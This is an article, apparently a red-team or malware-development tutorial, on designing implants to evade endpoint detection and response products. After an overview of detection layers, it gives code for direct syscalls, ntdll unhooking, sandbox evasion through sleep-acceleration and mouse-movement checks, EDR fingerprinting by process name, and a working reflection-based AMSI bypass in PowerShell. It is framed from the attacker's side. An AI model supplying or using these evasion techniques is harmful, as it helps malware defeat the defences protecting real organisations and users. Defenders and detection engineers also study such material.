# EDR evasion by design

Modern implants are not built first and then tested against EDR. They are built from
the start with specific EDR products as design constraints. Evasion is a requirement,
not an afterthought.

## How EDR products work

Understanding what to evade requires understanding the detection mechanism.

EDR products use several instrumentation layers simultaneously:

Kernel callbacks: notifications for process creation, thread creation, image loads,
and registry changes registered via kernel APIs. BYOVD targets these.

ETW (Event Tracing for Windows): the CLR, WMI, PowerShell, network stack, and many
other subsystems emit structured events that EDR collects. ETW patching targets this.

API hooking in userland: EDR injects a DLL into every process and hooks NT API
functions in ntdll.dll to inspect arguments before they reach the kernel. Syscall
bypass targets this.

File system minifilters: a kernel-level filter driver that intercepts file operations
and can scan or block them.

Network inspection: monitoring of outbound connections, DNS queries, and traffic
patterns.

User behaviour analytics: cross-process and over-time correlation of events to detect
sequences that look like attack techniques.

## Direct syscalls and unhooking

The most widespread EDR bypass technique targets userland API hooks. When an EDR hooks
`NtCreateThread` in ntdll.dll, it replaces the first bytes of the function with a
jump to its own inspection code. The bypass options are:

Direct syscalls: instead of calling the hooked ntdll function, issue the syscall
instruction directly with the correct syscall number. The EDR's hook is bypassed
because the hooked function is never called.

```c
// direct syscall stub (Windows x64)
// syscall number for NtAllocateVirtualMemory varies by Windows version
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, SYSCALL_NUMBER  // determined at runtime for the target version
    syscall
    ret
```

Tools like SysWhispers3 and Hell's Gate generate direct syscall stubs for all NT
functions and resolve syscall numbers dynamically at runtime to handle version
differences.

ntdll unhooking: rather than bypassing the hook, restore the original ntdll function
bytes by loading a clean copy of ntdll.dll from disk and copying its text section
over the hooked in-memory version.

```c
// load a fresh ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// map it, find the .text section, copy over the hooked version in memory
```

## Sleep and execution timing

Simple timing: delay execution long enough that the sandbox's analysis window expires.
Sandboxes typically run samples for 60-300 seconds. A sample that sleeps for 10
minutes and then executes evades most sandbox products.

The weakness: security products also accelerate sleep calls. A call to `Sleep(600000)`
may return almost instantly in a monitored environment. The bypass is to use
time-based checks rather than relying on sleep duration:

```c
// check wall clock time before and after sleep; if time did not advance, abort
FILETIME before, after;
GetSystemTimeAsFileTime(&before);
Sleep(30000);
GetSystemTimeAsFileTime(&after);

ULONGLONG elapsed = (*(ULONGLONG*)&after - *(ULONGLONG*)&before) / 10000;
if (elapsed < 25000) {
    // sleep was accelerated: likely in a sandbox
    ExitProcess(0);
}
```

## User interaction gates

Automated analysis environments do not simulate real user behaviour. Requiring user
interaction before execution gates the payload against sandboxes:

- Check for mouse movement since last check (GetCursorPos called twice with an interval)
- Check for foreground window changes
- Check that the cursor position is non-zero
- Check that there are running user processes (explorer.exe, browser, office apps)

```c
POINT p1, p2;
GetCursorPos(&p1);
Sleep(5000);
GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) {
    ExitProcess(0);  // no mouse movement: sandbox or unattended system
}
```

## Adaptive per-EDR evasion

Advanced implants probe the environment to identify which EDR product is present and
select the appropriate bypass technique:

```powershell
# identify EDR by process name or loaded DLL
$edrProcesses = @{
    'MsMpEng.exe'     = 'Windows Defender'
    'SentinelAgent'   = 'SentinelOne'
    'cb.exe'          = 'Carbon Black'
    'csfalconservice' = 'CrowdStrike'
    'xagt.exe'        = 'FireEye'
}

$runningEDR = Get-Process | Where-Object {
    $edrProcesses.ContainsKey($_.Name)
} | Select-Object -First 1

# select bypass technique based on detected product
```

This is no longer exotic. Commercial C2 frameworks include EDR fingerprinting as a
standard capability.

## AMSI bypass

AMSI (Antimalware Scan Interface) is a Windows API that allows script interpreters
(PowerShell, VBScript, JScript, .NET) to submit content to AV/EDR for scanning before
execution. It catches malicious PowerShell even when executed from memory.

The bypass: patch the `AmsiScanBuffer` function in `amsi.dll` within the current
process to always return AMSI_RESULT_CLEAN.

```powershell
# AMSI bypass via reflection (many variants; detection keeps up, bypass evolves)
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Context' }
$c = $b.GetValue($null)
[IntPtr]$ptr = $c
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

The specific technique above is widely detected; current-generation bypasses use
obfuscation, string splitting, and indirect reflection to avoid the known patterns.
The cat-and-mouse continues.
